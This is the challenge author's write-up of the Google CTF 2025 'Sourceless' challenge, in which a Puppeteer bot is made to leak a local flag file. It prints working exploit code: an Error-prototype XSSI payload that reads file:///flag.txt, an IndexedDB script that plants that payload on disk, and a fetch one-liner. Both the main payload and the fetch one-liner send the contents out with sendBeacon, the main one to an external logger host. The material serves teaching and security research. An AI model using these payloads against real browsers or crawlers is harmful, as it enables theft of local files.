# Sourceless writeup by [@terjanq](https://twitter.com/terjanq)
Google CTF 2025

## Challenge TL;DR

Players were given a simple puppeteer bot that visits any URL provided by the players.
The flag was stored as `file:///flag.txt` so the goal was to leak this file somehow

## Solution
The intended solution was to leak the flag file through an XSSI with help of
[CVE-2025-5263](https://www.mozilla.org/en-US/security/advisories/mfsa2025-42/#CVE-2025-5263). Players could either figure
out the solution from the error message or simply look through commits to discover the unit test for the vulnerability.

### Intercepting errors
It was possible in both Chrome and Firefox to intercept console errors by overwriting `Error.prototype` and
reading `error.message` property. Normally, when including a cross-origin script and it throws some errors `window.onerror` will
only return `Script error` for security purposes. However, one could notice that console errors contain full information, for
example `ReferenceError: abcdf is not defined`. When the console tries to construct the error message it uses shared Error
prototype with a website. This basically means that the website can pollute the prototype and execute some JavaScript.

Stealing the message can be done in the following way:

```html
  <script>
    ReferenceError.prototype.__defineGetter__('name', function(){
      const variable = this.message.split(' is ')[0];
      let decoded = '';

      for(const u16 of [...variable]){
        const i = u16.charCodeAt(0);
        decoded += String.fromCharCode(i % 256);
        decoded += String.fromCharCode(i >> 8);
      }
      navigator.sendBeacon('https://terjanq-logger.glitch.me/log2?id=sourceless', decoded)
    });
  </script>
  <script charset=utf-16le src="file:///flag.txt"></script>
```

The above script uses `utf-16le` charset so that the error message will be

```
Uncaught ReferenceError: 呃筆潌Ⅿ湯彧潬杮彧ㅬ敶瑟敨塟卓ⅉ紡 is not defined
```

You can read more about the technique [here](https://www.mbsd.jp/Whitepaper/xssi.pdf)


### Including the file
The snippet from the previous section will not work on a `https?://` protocol because of security reasons. However, any file
loaded through the `file://` protocol can include other files but can't read them directly (well, it shouldn't but sadly it did,
see the unintended section). The casual way of serving arbitrary files is to download a file and then visit it thorugh something
like `file:///home/users/user/Downloads/exploit.html` but it wasn't possible in the challenge because automatic downloads
were not enabled but also the system was in a read-only mode (except /tmp dir).

However, cached files and storage is stored as plaintext in user directory which in the challenge was set to `/tmp/firefox-userdata`.
In my solution I used indexedDB to store the exploit on the disk:

```js
async function saveBlob(dbName, storeName, key, blob) {
  const db = await new Promise((resolve, reject) => {
    const request = indexedDB.open(dbName, 1);
    request.onupgradeneeded = () => request.result.createObjectStore(storeName);
    request.onsuccess = () => resolve(request.result);
    request.onerror = () => reject(request.error);
  });
  const tx = db.transaction(storeName, 'readwrite');
  tx.objectStore(storeName).put(blob, key);
  await tx.done;
  db.close();
}

const myBlob = new Blob([`<!DOCTYPE html><html><body>
  <script>
    ReferenceError.prototype.__defineGetter__('name', function(){
      const variable = this.message.split(' is ')[0];
      let decoded = '';

      for(const u16 of [...variable]){
        const i = u16.charCodeAt(0);
        decoded += String.fromCharCode(i % 256);
        decoded += String.fromCharCode(i >> 8);
      }
      navigator.sendBeacon('https://terjanq-logger.glitch.me/log2?id=sourceless', decoded)
    });
  </script>
  <script charset=utf-16le src="file:///flag.txt"></script>
`], { type: 'text/html' });

saveBlob('myDB', 'files', 'file1', myBlob)
  .then(() => console.log('Blob saved!'))
  .catch(err => console.error(err));
```

After executing the code the file was stored in `file:///tmp/firefox-userdata/storage/default/https+++terjanq.me^userContextId=6/idb/2774579512mByD.files/1`.

After sending the bot to that URL it would send back the flag: **CTF{Loo!ong_longg_l1ve_the_XSSI!!}**

## Unintended solution

Sadly, when puppeteer is run with Firefox it disables multiple security features causing `file://A` and `file://B` be treated
as same-origin!! Specifically, `security.fileuri.strict_origin_policy` is set to false. This is a significant security gap allowing for some serious vulnerabilities if there are any crawles that
use puppeteer with Firefox, for example for PDF rendering.

I never expected this behavior to work so I didn't test for it. But players did and they solved the challenge with variations of this simple
payload:

```js
fetch('file:///flag.txt).then(e=>e.text()).then(e=>navigator.sendBeacon(url, e);
```

Note to myself to avoid using puppeteer with Firefox :) I leave it up to the players to report this security issue to puppeteer.
